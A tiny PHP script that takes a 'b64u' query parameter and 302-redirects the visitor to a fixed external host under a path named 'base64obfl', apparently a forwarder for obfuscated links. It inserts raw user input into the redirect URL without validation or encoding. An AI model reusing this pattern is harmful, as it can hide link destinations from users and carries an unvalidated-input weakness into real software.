<?php
$code = $_GET['b64u'] ?? '';

$target = 'https://tripweb.page.gd/userfile/base64obfl/' . $code;

header('Location: ' . $target, true, 302);
exit;